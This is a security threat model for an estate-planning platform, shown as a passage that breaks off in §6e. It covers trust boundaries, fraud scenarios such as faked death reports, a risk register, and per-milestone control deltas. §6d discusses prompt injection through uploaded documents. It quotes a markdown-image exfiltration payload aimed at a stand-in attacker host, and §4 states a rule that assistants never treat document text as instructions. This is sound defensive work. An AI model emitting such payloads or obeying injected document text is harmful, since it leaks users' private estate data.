# Estate Planning Platform — Threat Model

**Version:** 1.0 · Methodology: STRIDE per trust boundary + attacker-goal analysis, mapped to NIST 800-53 control families. This document is a living artifact; every new feature PR that crosses a trust boundary requires a threat-model delta.

---

## 1. What makes this platform's threat profile unusual

Most fintech threat models optimize for "attacker steals money today." This platform has three additional properties that reshape the model:

1. **It is a treasure map.** A single account enumerates every asset a family owns, where it is, what it's worth, who inherits it, and — via the vault — the credentials to reach it. Compromise value per account is far higher than a bank login.
2. **Death is a state transition with privileges attached.** The settlement workflow deliberately transfers access to third parties upon death. Any workflow that grants access on death can be attacked by *faking death* or by *being an insider to a real death* (the grieving-family window is a social-engineering goldmine).
3. **Authorized users are potential adversaries.** Trustees, executors, caregivers, and family members hold legitimate grants and also commit a large share of real-world elder financial abuse. The threat model must treat *granted* access as a monitored surface, not a solved problem.

## 2. Adversaries

| Adversary | Capability | Primary goals |
|---|---|---|
| Nation-state / APT | 0-days, supply chain, long dwell | Bulk PII, HNW-individual targeting, persistence |
| Organized crime | Credential stuffing, SIM swap, phishing kits, ransomware | Vault contents, asset intel for fraud, extortion |
| Malicious insider (platform) | Legitimate infra/DB access | Bulk decryption, audit tampering, targeted snooping |
| Malicious insider (estate) | Legitimate role grants | Over-broad access, premature settlement, distribution fraud |
| Opportunist / abusive family member | Owner's devices, shared knowledge, coercion | Account takeover of elderly users, beneficiary manipulation |
| Curious/negligent third-party pro | Attorney/CPA portal access | Data overexposure, credential mishandling |
| Automated/AI-driven attacker | Scaled spearphishing, voice cloning of "the deceased's lawyer" | Settlement-phase social engineering |

## 3. Trust boundaries

TB1: Internet → Edge (CloudFront/WAF/API GW) · TB2: Edge → Services (authn/z) · TB3: Service ↔ Service (mesh) · TB4: Services → Data stores · TB5: Platform → Third parties (Plaid, LLM providers, death-data providers, notification carriers) · TB6: Client device (Zone A crypto happens here) · TB7: Human operators → Production · TB8: Role-holders → Owner's estate data · TB9: Vault extension ↔ arbitrary web pages (added by M16).

TB9 is genuinely new rather than a subdivision of TB6. TB6 is the client DEVICE, whose adversary is malware or injected script on a surface we serve. TB9's adversary is an arbitrary PAGE the user visits — code we did not write, on an origin we do not control, reached over a channel (an extension that can read and write that page's DOM) which did not exist before M16. The two fail differently: TB6 is defended by the isolated origin, its CSP and its empty dependency tree, none of which apply to a page, while TB9 is defended by origin matching, a gesture requirement and a permission set. See §6j.

## 4. STRIDE highlights per boundary (top findings, not exhaustive)

**TB1/TB2 — Edge & AuthN**
- *Spoofing:* Credential stuffing and SIM-swap-based recovery abuse. → Passkey-first, SMS never sufficient alone, breach-corpus password checks, per-IP+per-account rate limits, device binding.
- *DoS:* Shield Advanced + autoscaling + per-tenant load shedding; settlement endpoints get separate quotas so an attack can't mask fraud attempts in noise.
- *Info disclosure:* GraphQL introspection off in prod; persisted queries only; error responses genericized.

**TB4 — Data stores**
- *Tampering:* Audit chain hash-anchored to WORM storage; DB roles cannot UPDATE/DELETE event tables; nightly chain verification with paging on gap.
- *Info disclosure:* Bulk-decryption detection — per-principal decrypt-rate baselines with hard circuit breakers (a service that normally decrypts 50 fields/min gets its KMS grant suspended at 50×, paging security). This is the single most important insider control: the KMS grant, not the database, is the chokepoint.
- *Elevation:* IRSA-scoped pod identities; no shared DB users; RLS as a second net under application authz.

**TB5 — Third parties**
- *Plaid token theft:* Access tokens decryptable only inside the sync worker's isolated namespace; tokens are per-item revocable; webhook signatures verified; anomalous sync patterns alert.
- *LLM data leakage:* Privacy proxy tokenizes names/SSNs/account numbers before provider calls; zero-retention contracts; per-feature consent; prompt-injection defense for any AI feature that reads user-uploaded documents (uploaded doc content is untrusted input — the assistant must never treat document text as instructions, and tool scopes for the assistant are read-only).
- *Death-data providers:* Treated as *signals*, never triggers. See §5.1.
- *Supply chain:* Pinned digests, SBOM + SLSA provenance, cosign verification at admission, dependency review gates, vendored critical libs, no postinstall scripts in CI.

**TB6 — Client**
- *Vault key theft via malware/XSS:* Strict CSP, Trusted Types, no third-party scripts on vault surfaces, WebCrypto non-extractable keys where platform allows, memory zeroization best-effort, clipboard auto-clear, re-auth on vault open.
- *Coercion/shoulder-surfing of elderly users:* Optional "trusted-contact review" mode where high-risk changes (new beneficiary + address change + export within 24h) trigger a notification hold.

**TB9 — Vault extension ↔ arbitrary web pages** (M16)
- *Filling the wrong origin (credential exfiltration):* This is the boundary's defining failure, because a filled credential belongs to the page that received it — the isolated world protects the extension's variables, not the DOM value, so the origin decision IS the disclosure decision. → Registrable domain via a vendored, digest-pinned Public Suffix List snapshot (never a substring, never label stripping); scheme binding, so an `https`-saved credential is never offered on `http`; cross-origin iframes refused by default with a per-item opt-in; confusable domains REFUSED rather than warned about.
- *A hostile page inducing a fill:* → The content script is structurally unable to REQUEST a credential — its message union carries no such variant and it cannot import the key holder. A fill is a one-shot injection into a named frame at the moment of a gesture in extension-owned UI, so there is no standing channel a page can address, and nothing is ever auto-submitted.
- *A hostile page reading the vault by breadth of access:* → `activeTab` + `scripting` only, with no declared content scripts, so the extension has no view of any page until the user clicks it — and any later broadening is a required-permission increase the browser surfaces as re-consent.
- *Compromised store update (the boundary's un-detectable case):* An auto-updated signed artifact has no CSP in its path, and a self-check is written by the same artifact. → Blast-radius reduction first (an `extension` session audience admitted per handler, so it cannot destroy a vault), permissions pinned as data, reproducible builds, published SLSA provenance, and a third-party-runnable verification procedure. *Residual, accepted and stated:* an update keeping the same permissions exfiltrates everything the user unlocks and the platform cannot detect it.
- *Phishing:* Autofill does not resist it. A credential saved at a lookalike is filled at that lookalike. Passkeys are the structural answer and are a separate milestone; the refusal above is the bound M16 owes, and with `activeTab` it fires when the user opens the extension, not when they land on the page.

**TB7 — Operators**
- No standing prod access; JIT elevation with peer approval and session recording; all operator reads of user data are themselves audit events surfaced to the user ("Anthropic-style" transparency: users can see that support accessed X on date Y); separation of duties between deploy, data, and key administration.

## 5. Platform-specific attack scenarios (the ones generic checklists miss)

### 5.1 Fraudulent death trigger ("kill them on paper")
**Attack:** Adversary (often a would-be heir or an account-takeover attacker who wants executor-level access) reports the owner dead with a forged certificate or exploits a false-positive from a death-data provider.
**Controls:** (1) No automated trigger from any single source — provider matches only open a *case*. (2) Mandatory human review of certified evidence. (3) Waiting period (default 5 days, configurable up) during which the platform aggressively attempts owner contact through every channel including hardware-key challenge; any owner sign-in with step-up MFA instantly voids the case and flags the reporter. (4) Account enters `deceased_pending` — reads freeze for role-holders; nothing unlocks early. (5) Executor access post-verification is *staged*: inventory first, vault emergency-access last, each stage separately approved. (6) The reporter's identity is verified and recorded; fraudulent reports are preserved for law enforcement.

### 5.2 Emergency-access abuse
**Attack:** A designated emergency contact invokes vault access while the owner is alive but unaware (hospitalized, traveling, cognitively declining).
**Controls:** Waiting period ≥ 24h (owner-configurable), multi-channel owner notification with one-tap deny, optional M-of-N Shamir requirement so no single contact can unlock alone, full audit visible to owner afterward, and scope limits (contacts can be granted vault subsets, not all-or-nothing).

### 5.3 Insider bulk decryption
**Attack:** Platform engineer or compromised service identity attempts mass read of SSNs/documents.
**Controls:** Per-user DEKs mean bulk access requires bulk KMS operations — rate-limited, anomaly-detected, circuit-broken (§4/TB4); CloudHSM roots mean even AWS-level compromise can't silently exfiltrate key material; canary records (fake users with tripwire fields) page on any access.

### 5.4 Grief-window social engineering
**Attack:** After a real death, attackers phish executors/beneficiaries ("probate portal fee required"), possibly with AI voice cloning of the family attorney.
**Controls:** All settlement communication happens in-app only; emails/SMS are content-free pointers by design, and onboarding for role-holders drills this ("we will never link you to a payment page"); executor dashboard shows verified contact cards for the estate's attorney/CPA; distribution approvals are dual-control with step-up MFA.

### 5.5 Beneficiary-conflict information abuse
**Attack:** A beneficiary with read access enumerates other beneficiaries' shares to contest or coerce.
**Controls:** ABAC default — beneficiaries see only assets naming them and only their own designation, unless the owner explicitly opens visibility; access-pattern anomalies (rapid enumeration) alert the owner.

### 5.6 Ransomware / destructive attack
**Attack:** Encrypt-and-extort against databases and object storage.
**Controls:** Immutable, cross-account, Vault-Locked backups the prod account cannot delete; monthly automated restore verification; event-sourced domains can rebuild projections; ransomware-specific runbook with decision tree and pre-negotiated IR retainer; audit chain proves data integrity post-recovery.

## 6. Risk register (top 10)

| # | Risk | L | I | Residual treatment |
|---|---|---|---|---|
| 1 | Account takeover of elderly / low-security users | H | H | Passkey nudges, trusted-contact review mode, adaptive step-up |
| 2 | Fraudulent settlement trigger | M | Critical | §5.1 layered controls; annual red-team of the flow |
| 3 | Insider bulk data access | M | Critical | KMS chokepoint + detection; JIT access; canaries |
| 4 | Vault client-side compromise (XSS/malware) | M | Critical | CSP/Trusted Types; isolated vault origin; bug bounty focus area |
| 5 | Plaid/aggregation token abuse | M | H | Namespace isolation, revocation drills |
| 6 | LLM prompt injection via uploaded docs | H | M | Untrusted-input framing, read-only tools, output filtering |
| 7 | Supply-chain compromise of a dependency | M | H | SLSA, pinning, admission control, egress allowlists |
| 8 | Legal/compliance failure in a state template | M | H | Attorney-gated template releases; per-state execution-requirement engine |
| 9 | Ransomware | M | H | §5.6; RTO 15m / tested restores |
| 10 | Notification-channel phishing of role-holders | H | M | Content-free notifications, in-app-only sensitive comms |

## 6a. Threat-model delta — M6 vault, Zone A (2026-07-27)

This document requires a delta for every feature PR that crosses a trust
boundary. M6 activates **TB6 (client device)** in earnest: until now no code
held keys the server could not derive, and risk #4 (vault client-side
compromise, Critical) described something that did not exist yet.

**Controls now shipped.**
- Keys derive from the vault password AND a 128-bit device-only Secret Key
  (2SKD), so the server-held verifier and wrapped master key are useless to an
  attacker who has the database and a correct password guess. This is the
  control that makes §5.3 (insider bulk decryption) structurally inapplicable to
  Zone A: there is no bulk decryption path, because there is no decryption path.
- The vault password never transits (SRP-6a). Every unlock failure emits
  `vault.open.failed`, which is what makes §4/TB4-style burst detection possible
  for vault access specifically.
- Master and item keys are unwrapped as **non-extractable `CryptoKey`s**, the
  TB6 "non-extractable keys where the platform allows" control — an injected
  script in the vault origin can use them but not read them out.
- `@estate/vault-crypto` has zero runtime dependencies, enforced by lint and by
  a source-scanning test. This is the TB6 supply-chain control: the code holding
  the only keys that open a vault has no transitive tree to compromise.
- The client pins the KDF and SRP parameters the server serves it, so a
  malicious server cannot downgrade the group or the iteration count.
- Step-up MFA gates vault open and all key-material changes, per §5 of the
  architecture doc.

**Residuals accepted, and why.**
- *JS `bigint` is not constant-time.* True of every JavaScript SRP; bounded by
  network jitter, and no code path branches early on a secret comparison.
- *Full-history rollback.* A server that serves an old blob AND claims its old
  version is detectable only by client-side last-seen state. Same class as every
  hosted zero-knowledge store. Per-version AAD binding stops the easier attack:
  replaying a blob at a *different* version fails to decrypt.
- *Reset is token-gated.* A forgotten password cannot be proven, so the reset
  route is the one place step-up-fresh stolen tokens can destroy — never read —
  a vault. Compensating: distinct audit action, step-up freshness, and owner
  notification when the notification port lands.
- *No rate limiting on failed SRP proofs yet.* Tracked with identity's login
  rate limiting; handshakes burn on attempt in the meantime.

**§5.2 emergency-access controls, now shipped (M6 PR2).**
- *Waiting period ≥24h, owner-configurable:* enforced by the platform half of a
  two-level split (`RK = platform_part XOR contacts_part`). Colluding grantees
  hold only the contacts half, which is information-theoretically useless alone,
  so the delay is a cryptographic constraint rather than an honour system.
- *Multi-channel owner notification with one-tap deny:* the notification port
  ships with a stub, and the emergency-access routes **refuse in production**
  while only the stub is wired — a waiting period nobody can be told about is
  not a control. Denial is deliberately the one owner action with no step-up
  requirement, because it must be one tap from a notification.
- *Optional M-of-N:* implemented over GF(2^8), threshold 1 by default.
- *Full audit visible to the owner afterward:* every transition is recorded,
  including refused requests, so a grantee who tried repeatedly is visible.
- *Denial is sticky*, with no time-based cooldown — a cooldown would tell a
  patient grantee how long to wait, and outlasting the owner is the attack.
- *Key substitution* (not in §5.2's list, but the same threat class): shares are
  sealed to a public key the owner confirms out of band by fingerprint, and the
  key each share was sealed to is recorded so a later change is detectable.

**Residual accepted here:** the platform half lives on the server, so a server
that releases it early defeats the waiting period. Inherent to docs/01's design
— a delay enforced by a party is only as good as that party. The split still
guarantees that a database dump alone is insufficient, and that no contact can
act alone.

**Not yet shipped, and therefore not yet mitigated.**
- §5.2's *scope limits* (granting a contact a vault subset) remain deferred;
  per-item keys are in place so it is a later grant feature, not a
  re-architecture.
- §5.1 control 5 — settlement's staged access, with vault emergency access last
  and separately approved — is an **M7 integration point**. The release path
  must consult settlement state once settlement exists.
- The isolated vault origin, CSP, and Trusted Types are frontend controls; no
  vault UI ships in M6, so they land with that surface.

## 6b. Threat-model delta — M7 settlement PR1 (2026-07-27)

M7 activates **TB8 (role-holders → owner's estate data)** in earnest: it is the
first flow where the acting principal is routinely NOT the resource owner, and
the first that deliberately changes another user's account state. §5.1 is the
control specification; this delta records how each control landed.

**Controls now shipped (PR1: intake → review → waiting period → verified).**
- *No automated trigger from any single source (control 1).* Intake only OPENS
  a case. Reporters must already be named by the decedent's contact repository
  (`contacts.linked_user_id`) — no lookup by email or arbitrary id exists, so
  intake cannot enumerate accounts. Death-data provider matches are
  operator-filed signals (`data_provider`), never triggers. One open case per
  decedent (partial unique index).
- *Mandatory human review (control 2).* Operators are ordinary platform users
  on a CLI-managed allowlist (`settlement_operators`; deliberately NO runtime
  grant API — a stolen operator session cannot mint operators). Review
  decisions are step-up-gated; reviewer ≠ reporter is a DDL CHECK plus a row
  check; "no privileged status without recorded review" is a DDL CHECK. The
  reviewing operator can read death-certificate evidence through a dedicated
  documents route whose authority is settlement's answer, cross-checked
  against the document's REAL owner — a reporter registering someone else's
  document id as evidence gets an operator a uniform 404, not a decryption.
- *Waiting period with aggressive owner contact (control 3).* Default 5 days,
  owner-configurable UP to 60 (floor in DDL + schema + service; changes
  refused while a case is open — a pending case's parameters are frozen).
  Escalating contact attempts on a 12h multi-channel schedule, recorded
  append-only. The in-process driver that performs them holds NO transition
  power: timer expiry only makes a case ELIGIBLE; an operator (again never the
  reporter) explicitly confirms, and the confirmation re-checks owner liveness
  against identity's append-only step-up ledger — a step-up newer than the
  case voids it on the spot, restores the account, and flags the reporter.
  That check is enforced TWICE, deliberately: settlement reads liveness before
  asking for the terminal transition, and identity restates the predicate in
  the same single statement as the status write (a `NOT EXISTS` over
  `auth_events` in the CAS `UPDATE`, same cluster, no network hop). Without
  the second one, a step-up landing between settlement's read and its commit
  would be invisible, and — since there is no un-verify ceremony — would
  entomb a living owner in `settlement` irreversibly. The interlock turns that
  race into a refusal (`409 owner_alive`) that voids the case instead.
  The owner's own kill switch is a step-up-gated void route (the step-up IS
  the liveness proof; a bare stolen bearer cannot void).
- *Account enters deceased_pending (control 4).* Cross-service, identity-
  enforced: a closed transition table (active↔deceased_pending→settlement)
  behind a dedicated service credential; identity applies its own invariants
  regardless of what settlement asks. The lock call happens INSIDE the case
  transaction — an unconfirmable lock rolls the transition back. During
  deceased_pending the OWNER's login and sessions stay alive (the rescue
  path) while profile's role-holder contact grants freeze. At verified the
  status becomes `settlement`, every session is revoked, live-token lookups
  fail via a status allowlist in the session SQL, and re-login gets the
  generic 401 with a distinct recorded reason (`account_settled` — decedent-
  credential replay is a detection signal). Post-verified rescue is
  deliberately not self-serve.
- *Reporter identity preserved (control 6).* `reported_by` is a verified
  platform user; rejected and voided cases are terminal rows that are never
  deletable (cases have no soft delete BY DESIGN), with `resolution`
  distinguishing operator rejection from owner void; every audit event on the
  flow preserves the reporter id.

**New trust machinery, flagged.** A static shared service credential
(`ServiceCredentialGuard`, constant-time compare, fail-closed when unwired;
required ≥32 chars in production) authenticates settlement on identity's
internal settlement-lock routes — the one flow with no user bearer token to
forward by construction. Interim until the mesh (mTLS/SPIFFE) provides
verifiable peer identity; the guard is the seam.

**Deliberate deviations.** Temporal is deferred behind a powerless in-process
driver (approved: there is no deployment for its durability to protect; the
DB state machine docs/02 §7 mandates is authoritative either way). Intake and
review-approve REFUSE in production while only the stub notifier is wired
(503, the M6 emergency-access precedent) — a waiting period nobody can be
told about is not a control.

**Control 5 — staged executor access — now shipped (PR2).**
- *Staged, ordered, separately approved.* `inventory → documents → vault`, and
  the order IS the control: an executor may request only the next rung, each
  requires an operator approval, and Zone A is therefore structurally the
  furthest grant from a fresh death report. A requested stage grants nothing.
- *Two people per stage.* The executor requests, an operator approves, and a
  DDL CHECK forbids them being the same person. Executor designation
  (`role_assignments`, the dormant `on_death_verified` half that settlement is
  the first consumer of) grants nothing on its own.
- *§6a closed.* The vault's emergency-access `request` AND `release` now
  consult settlement — twice, once before the waiting clock starts and again
  inside the release transaction after the row lock, because the period is
  days long and an estate can enter settlement in between. A non-terminal case
  without an approved `vault` stage BLOCKS; so does an unreachable settlement,
  since the client fails closed on every path. That direction is deliberate:
  blocking delays a legitimate recovery (the escrow is unspent and releases
  once the stage lands), while allowing hands a fraudulent "heir" the platform
  half of the recovery key inside the very window §5.1 exists to protect.
  Refusals are audited as `vault.emergency.release_blocked` with the case id.
  The gate is authenticated by the SERVICE credential, not the grantee's
  bearer — the question is about the owner's estate, not the caller's rights.
- *Distributions under dual control* (docs/02 §7): the recorder is stamped from
  the verified session at insert, the approver must differ, and a row-local
  CHECK enforces it immediately rather than a trigger (both parties are columns
  of the same row, so a CHECK is stricter — undeferrable and unbypassable).
  Amounts are envelope ciphertext under settlement's own `settlement/kek`, so
  profile's KMS grant cannot read them even sharing the cluster; the plaintext
  never enters a column, a log, or an audit payload.
- *Estate reads are the data owner's decision.* Assets exposes a separate
  executor route that forwards the caller's bearer to settlement and refuses on
  anything short of an explicit allow; settlement itself holds no data-read
  power, so compromising it mis-answers questions rather than exfiltrating an
  estate. Each such read is audited as `asset.estate.viewed` with the decedent
  as `onBehalfOf`.
- *Legal hold* (docs/00 compliance) is now settable — by settlement only,
  through a service-credential internal route, closing the M4 gap where the
  hold was enforced but had no writer.

**Residual added by PR2.** A settlement operator can approve every stage of a
case they did not report, so an insider operator plus a colluding "executor"
designation is a two-party path to an estate. Bounded by: the executor
designation must already exist in the decedent's own contact records (made
before the death), the reporter≠reviewer and requester≠approver rules, the
waiting period and owner-void that precede any of it, and a fully audited
trail. Reducing it further needs M-of-N operator approval, which belongs to
the TB7 operator-platform milestone alongside JIT elevation.

**Residuals accepted.** The liveness interlock narrows the lockout race to a
single statement but cannot erase it: a step-up committing inside that
statement's window is still missed. The blast radius is bounded — after the
transition, sessions are revoked and the status allowlist blocks every session
lookup, so the step-up buys nothing and the attempt is preserved in
`auth_events` for after-the-fact review — and closing it completely would
require the step-up path to take the users row lock, which is the right shape
for the operator-platform milestone rather than a settlement-side fix. A
settlement operator is a high-value target; the
interim allowlist has no JIT elevation or peer approval (TB7 milestone), and
one operator both approves and confirms a case (two actions, one human) —
bounded by reviewer≠reporter, the liveness re-check, the owner's void, and
the append-only audit trail; PR2's stage approvals add multi-party depth.
Rate limiting on intake shares identity's rate-limit follow-up (per-reporter
noise is bounded by the linked-contact gate and one-open-case index).

**Service-credential scoping (added by the M7 security review, 2026-07-28).**
The internal service credentials introduced for the account lock and the §6a
gate are the one M7 mechanism that can bypass §5.1's control chain outright, so
they carry their own rule: **one secret per callee, per direction.** Each
variable is named for the service whose internal routes it OPENS
(`IDENTITY_INTERNAL_TOKEN`, `SETTLEMENT_INTERNAL_TOKEN`,
`DOCUMENTS_INTERNAL_TOKEN`), never for the caller that presents it, and no
value ever authenticates in both directions.

The review found the original design violating this: settlement used one config
field as both its inbound-expected and its outbound-presented value, which
transitively forced identity, settlement, vault and documents onto a single
shared secret. Anyone holding vault's copy — the most exposed service in the
product, and by Zone A design the one that should hold the least authority —
could call `PUT /internal/v1/settlement-lock/{victim}` twice and irreversibly
move a living user to `settlement` status with no case, no operator, no waiting
period and no owner-void window. That is §5.1's Critical outcome reached by
skipping every control above, and it is the sharpest illustration of why the
credential is scoped rather than shared: a static bearer secret confers exactly
the routes it opens, so the blast radius IS the naming discipline.
Settlement's config refuses to boot in production when its two credentials are
equal, because splitting the field does not stop an operator pasting one value
into both slots. Rotation remains a synchronized restart of two services; the
mesh mTLS/SPIFFE follow-up removes the static secret rather than improving it.

## 6c. Threat-model delta — M9 notifications (2026-08-04)

M9 turns the §6a/§6b notification PRECONDITIONS into a running control: the
notifications service (docs/01 §2.10, TB5's carrier boundary) delivers the
owner notifications that the emergency-access and settlement waiting periods
rest on. Controls shipped, each mapped to what this document demanded:

- **Content-free pointers are enforced by construction, not convention
  (§5.4, risk #10).** The wire schema has no text field — a closed kind enum,
  a user id, a requested channel, an optional deadline — so a compromised
  caller can trigger a template, never author a message. The template
  registry carries no user data beyond the deadline DATE, uses ONE uniform
  SUBJECT for every kind, and contains NO links of any kind. The production
  e2e asserts all three properties on a real delivered message.
  SCOPED PRECISELY (M9 security review): the uniform subject means a mailbox
  observer who sees only subject lines cannot tell which control fired, but
  the BODY names it in its first clause ("…asked for emergency access to your
  Estate vault", "A report was filed on your Estate account"). That is
  deliberate — an actionable body is what makes the notification a control
  rather than a curiosity — but it means a lock-screen preview and the
  carrier both learn the EVENT CLASS. See the residual below; the earlier
  claim that an observer "never learns WHICH control fired" was true of the
  subject only and is corrected here.
- **Recipient addresses never cross a cluster boundary (§5.3).** The service
  keeps its own store, AEAD under its own `notifications/kek` (core
  co-tenants cannot unwrap it), fed by identity at the two plaintext moments
  (registration, login). No email-ciphertext read path exists anywhere; no
  blind index exists on the store (nothing legitimate asks "which user has
  this address"). Every send's decrypt is a logged event.
- **The gates stay, and became visible.** The per-route 503s remain as
  defense in depth behind the production adapter pins (`NOTIFY_MODE=http`,
  `EMAIL_MODE=ses`), and now emit `vault.emergency.notifications_refused` /
  `settlement.notifications_refused` — a control firing must be
  distinguishable from an outage in the stream operators watch.
- **The credentials are scoped (§6b's rule), and there are TWO.** Corrected by
  the M9 security review, which found ONE credential opening both surfaces:
  `NOTIFICATIONS_INTERNAL_TOKEN` opens SEND only (holders settlement, vault),
  and `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN` opens the recipient upsert
  and is held by IDENTITY ALONE. The split matters because the two
  capabilities have different blast radii: sending is bounded spam, while
  deciding where a user's notifications GO is the power to silence the §5.1
  contact sweep and the §5.2 waiting-period alerts. Merged, vault's copy
  could silence settlement's death-case alerts and settlement's could silence
  vault's emergency-access alerts — cross-domain, and exactly what one secret
  per callee exists to prevent. Enforced by two guards binding two DI tokens;
  the service refuses to boot in production if the two values are equal, and
  pairwise aliasing refusals extend to both in every holder.

**Residuals, accepted and recorded:**

- *Email is the only live channel.* §5.2's "multi-channel" and §5.1's
  "every channel including hardware-key challenge" remain aspirational;
  the contact trail records channel INTENT (push/sms/voice) while delivery is
  email. SMS/push arrive with their own carriers and their own review.
- *No one-tap deny token yet.* Deny remains an in-app action ("open your
  Estate app"); an email-borne deny capability needs the vault UI's isolated
  origin to exist and its own token design + review. Until then the
  notification shortens discovery time but not the deny path.
- *Repointing an EXISTING user's address needs identity's credential.* Since
  the M9 review's split this is true as written: only
  `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN`, held by identity alone, can
  change where a user's alerts go. (Before the split it was false — vault's
  and settlement's copies sufficed, and this document said otherwise.)
  Recipient changes are versioned and audited, but see the next residual.
- *The recipient-change audit cannot ATTRIBUTE.* `notification.recipient.updated`
  carries `actorId: null`, `actorType: 'service'` and an empty detail, the
  versions trigger stamps the system sentinel, and identity emits the same
  event on EVERY successful login — so the trail proves that an address
  changed and preserves the prior ciphertext, but cannot distinguish a
  legitimate login-time refresh from a malicious repoint. It is evidence for
  after-the-fact recovery, NOT a detection control, and should not be cited
  as one. Closing it means recording the calling service, which the static
  shared-secret model cannot do — it arrives with the mesh's peer identity.
- *Users' addresses are UNVERIFIED.* **CLOSED by M14** — see §6h. The residual
  as it stood: registration performed no ownership proof, identity fed whatever
  the user typed into the delivery store, and `users.email_verified_at` was
  never written or read, so "identity's word" meant the address was TYPED, not
  OWNED. `users.email_verified_at` remains dead schema deliberately; the
  verified bit lives on `notification_recipients`, in the store that would have
  to do the reaching.
- *The carrier sees addresses, timing, AND the event class (TB5).* Inherent
  to email, and wider than previously recorded here: the body names which
  control is running, so SES and the receiving provider get a per-address
  labelled event stream ("this account is in a death-review period"). The
  content-free doctrine bounds this to the event class — never estate
  content, never a name, an asset, a document title or a link — but it does
  not eliminate it. Closing it fully needs an out-of-band or encrypted push
  channel, i.e. the vault UI's isolated origin. SES supply-chain posture
  rides the existing AWS SDK pinning.
- *`emergency.reminder` is declared but never emitted* (vault has no
  scheduler); the sweep-driven reminder belongs with Temporal or a later
  driver.

**The M6 delivery-channel identifier leakage item: PARTIALLY CLOSED.**
Answered by the M9 security pass rather than left owed. Closed, by
construction: no caller-authored text anywhere (the wire has no text field),
no identifiers of any kind in a message (no name, address, asset, document
title, case id, user id or token — the only variable is a date), no links at
all so no per-recipient URL can re-identify a recipient to the carrier, one
subject across all nine kinds, and addresses that never cross a cluster
boundary. Still open, and now recorded above rather than claimed closed: the
EVENT CLASS reaches the carrier and any body-preview observer, and that is
accepted deliberately because an actionable body is what makes the
notification function as a control. Fully closing it is the isolated-origin
push channel, a later milestone.

## 6d. Threat-model delta — M10 AI assistant PR1 (2026-08-04)

The assistant is the first component an attacker can address in **natural
language**, through document text the owner uploaded and asked it to read. Risk
#6 ("LLM prompt injection via uploaded docs", H/M) stops being a forecast here.

**Treatment, in the order it actually holds.** The register's stated treatment
was "untrusted-input framing, read-only tools, output filtering". Building it
made the ordering clear, and the ordering is the finding:

1. **No tool schema can name a subject.** A tool receives its authority — the
   verified session subject plus that caller's bearer — and declares only what
   to fetch, never whose data. Injected text can persuade the model to CALL a
   tool; it has no field in which to say whose estate it wants. Enforced at
   registry construction, so a violation is a process that will not start.
2. **No sink.** Every tool is read-only; there is no send, write, outbound-fetch
   or web-search tool. The worst a successful injection achieves is a
   misleading answer to the owner about the owner's own data, which is exactly
   why the impact rating is Medium and what keeps it there. Adding any
   outward-facing tool would change that rating and requires revisiting this
   section.
3. **Framing retrieved text as data is ADVISORY** and is documented as the
   weakest layer in its own source file. It neutralizes delimiter injection so
   content cannot terminate its own block, but a sufficiently clever payload can
   argue with layer 3. Layers 1 and 2 cannot be argued with.

"Output filtering" is deliberately NOT claimed as a control.

**MODEL-OUTPUT EXFILTRATION — CLOSED IN M11, and worth reading as a history of
how nearly it was not.** An M10 draft of this paragraph credited PR4 with
"restricted markdown, no autolinking, no remote images". PR4 shipped no
conversation UI and no renderer at all, so the paragraph dispositioned a live
risk against a control nobody had built — the M4 legal-hold zero-callers shape,
in prose. The M10 security review caught it and reopened the requirement, owed
by whoever shipped the chat surface, in the same PR as the first pixel of
model-authored text.

M11 is that PR, and the constraint is now real. `MessageText`
(`apps/web/src/components/MessageText.tsx`) is the ONLY renderer any message
gets, in either role, and it builds text nodes: no parser, no allowlist, no
`dangerouslySetInnerHTML` (a source scan over the whole app enforces that, with
`app/layout.tsx`'s theme script as the one declared exemption). A model-emitted
`![](https://attacker/?data=…)` renders as those characters — verified in a real
browser against a payload carrying a markdown image, a markdown link and a raw
`<img>` tag: zero image elements, zero anchors to the payload's host, zero
network requests to it.

Behind it, and independent of it, the app now sends a Content-Security-Policy
with `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
remote image load even if a future renderer regresses. **That CSP is
deliberately not complete**: `script-src` still allows inline, because Next's
hydration bootstrap and the theme script are inline and locking them down needs
per-request nonces through middleware. Saying so plainly is the point — a
stricter directive that gets relaxed under deploy pressure would be worse than
an honest partial one.

It remains a rendering constraint rather than a filter on model output; calling
it filtering would overclaim. The cost is stated where it lands: answers render
as plain prose with no lists or emphasis, and whoever adds formatting inherits
this requirement, because adding a parser here is adding a sink.

**TB5 — the LLM provider boundary.** The assistant is the isolating service:
the provider SDK and its credential will exist only there (PR2). It holds NO
internal service credential in either direction, so a compromised assistant
replays the sessions it is currently serving and cannot mint new authority —
the property is machine-checked by the credential graph rather than asserted.
Conversation transcripts are Zone B under a dedicated `ai-assistant/kek`, and
they are persisted precisely so the client cannot supply history: a
client-supplied transcript could forge prior assistant turns and prior tool
results, and a forged tool result is indistinguishable from a real one.

**A constraint our own requirements impose on model choice.** docs/03 §4 TB5
requires providers under zero-data-retention agreements. Claude Fable 5
requires 30-day retention and is not available under ZDR, so the most capable
model is disqualified by our own threat model; PR2 targets a ZDR-eligible model.

**Consent.** Deny by default structurally — there is no `granted` boolean, so
a user who never answered and one who revoked are the same answer. Granting is
step-up gated because it widens third-party egress (export-class under docs/01
§5); revoking is not, on the M6 rule that the protective action must never be
harder than the permissive one.

**Recorded, not fixed.**
- *Uploaded-document text remains unreadable by anything.* M4's OCR artifact has
  no decrypt counterpart and M10 does not add one, so the assistant cannot
  discuss anything a user uploaded. That is a capability gap, not a control —
  closing it means building a bulk-readable text path, which is what §5.3
  exists to prevent, and it needs its own PR, consent scope and delta.
- *Conversations are outside staged settlement access (§6a).* An executor gets
  inventory, then documents, then vault; conversations are in none of those
  rungs and `assistant.cedar` grants no role-holder verb. A transcript ranges
  over the whole estate and may contain content the owner never intended anyone
  to read, so admitting it would need its own milestone and its own decision.
- *The egress assertion is narrow on purpose.* It refuses separated SSNs and
  Luhn-valid card numbers and deliberately passes names, emails and phone
  numbers, which are the PR2 tokenizer's job. A gate that fires on ordinary
  estate traffic is one people route around.

## 6e. Threat-model delta — M12 documents surface PR1 (2026-08-06)

M4 built the document service; nothing rendered a document until now. The new
surface is a place where **stored document content reaches a screen**, which
puts risk #6 (LLM prompt injection via uploaded docs, H/M) next to a second,
older question this repo had not yet had to answer: what happens when the
browser is handed a document's own markup.

**The renderer, and why it differs from `MessageText`.** §6d's answer for model
output was an ABSENCE — text nodes, no parser, no sink. A document cannot be
rendered that way and still be a document, so `DocumentViewer`
(`apps/web/src/components/DocumentViewer.tsx`) substitutes CONTAINMENT: the
